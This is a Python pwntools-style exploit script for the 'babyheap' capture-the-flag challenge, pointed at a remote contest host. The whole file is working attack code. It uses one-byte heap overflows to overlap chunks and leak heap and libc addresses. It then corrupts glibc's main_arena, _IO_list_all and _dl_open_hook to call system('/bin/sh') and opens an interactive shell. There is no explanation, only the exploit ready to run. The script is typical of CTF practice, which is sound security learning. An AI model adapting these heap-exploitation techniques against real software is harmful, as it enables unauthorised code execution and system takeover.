#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './babyheap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'202.120.7.204', 'port':127})
                        #remote  = {'host':'localhost', 'port':127})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.24.so')
env.select()

#==========

binf = ELF(bin_file)
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    bh = BabyHeap(conn)

    bh.allocate(0x18)   # 0
    bh.allocate(0x18)   # 1
    bh.allocate(0x28)   # 2
    bh.allocate(0x58)   # 3
    bh.allocate(0x20)   # 4
    bh.allocate(0x10)   # 5
    bh.allocate(0x18)   # 6

    bh.update(0, 'a'*0x18+'\x51')
    bh.update(2, 'b'*0x28+'\xa1')
    bh.update(5, 'c'*0x8+'\x11')

    bh.delete(1)
    bh.allocate(0x48)   # 1

    chunk  = '0'*0x18
    chunk += p64(0x91)
    bh.update(1, chunk)

    bh.delete(3)
    bh.delete(2)

    leak = bh.view(1)
    addr_heap_base = u64(leak[0x20:0x28]) - 0x70
    addr_libc_mainarena     = u64(leak[0x28:0x30]) - 0x58
    libc.address            = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_io_list_all   = libc.symbols['_IO_list_all']
    addr_libc_dl_open_hook  = libc.symbols['_dl_open_hook']
    addr_libc_system        = libc.sep_function['system']

    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    
    bh.allocate(0x28)   # 2
    bh.allocate(0x18)   # 3
    bh.allocate(0x18)   # 7
    bh.allocate(0x18)   # 8

    bh.update(2, 'A'*0x28+'\x61')
    bh.delete(3)
    bh.allocate(0x58)   # 3

    chunk  = 'B'*0x18
    chunk += p64(0x41)
    chunk += 'C'*0x18
    chunk += p64(0x51)
    bh.update(3, chunk)

    bh.delete(7)
    bh.delete(8)

    chunk  = p64(addr_libc_mainarena + 0xe8)
    chunk += p64(addr_libc_mainarena + 0xe8)
    chunk += 'B'*0x8
    chunk += p64(0x41)
    chunk += p64(0x51)
    bh.update(3, chunk)

    bh.allocate(0x38)   # 7
    chunk  = 'D'*0x18
    chunk += p64(0x51)
    chunk += p64(addr_libc_mainarena + 0x10)
    bh.update(7, chunk)

    bh.allocate(0x48)   # 8
    chunk  = 'E'*0x10
    chunk += p64(0x60)
    chunk += p64(0x31)
    bh.update(8, chunk)

    bh.allocate(0x48)   # 9
    fake_mainarena  = '\x00'*0x38
    fake_mainarena += p64(addr_libc_io_list_all - 0x28)
    bh.update(9, fake_mainarena)

    bh.allocate(0x58)   # 10
    bh.allocate(0x20)   # 11

    bh.update(11, '\x00'*0x18+p64(addr_heap_base + 0x60))
    bh.update(6, '\x00'*0x8+p64(addr_heap_base + 0x140 - 0x18)+p64(addr_libc_system))

    chunk  = '0'*0x18
    chunk += p64(0x91)
    bh.update(1, chunk)
    bh.delete(2)

    chunk  = '0'*0x18
    chunk += p64(0x61)
    chunk += p64(0xdeadbeef)
    chunk += p64(addr_libc_dl_open_hook - 0x10)
    bh.update(1, chunk)
    bh.allocate(0x58)   # 2
    bh.update(2, '\x00'*0x10+'/bin/sh'.ljust(0x20, '\x00')+p64(0)+p64(1))

    conn.recvuntil('Command: ')
    conn.sendline('5')

class BabyHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def allocate(self, size):
        self.recvuntil('Command: ')
        self.sendline('1')
        self.recvuntil('Size: ')
        self.sendline(str(size))

    def update(self, idx, content):
        self.recvuntil('Command: ')
        self.sendline('2')
        self.recvuntil('Index: ')
        self.sendline(str(idx))
        self.recvuntil('Size: ')
        self.sendline(str(len(content)))
        self.recvuntil('Content: ')
        self.send(content)

    def delete(self, idx):
        self.recvuntil('Command: ')
        self.sendline('3')
        self.recvuntil('Index: ')
        self.sendline(str(idx))

    def view(self, idx):
        self.recvuntil('Command: ')
        self.sendline('4')
        self.recvuntil('Index: ')
        self.sendline(str(idx))
        self.recvuntil(': ')
        return self.recvuntil('\n1. Allocate', drop=True)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
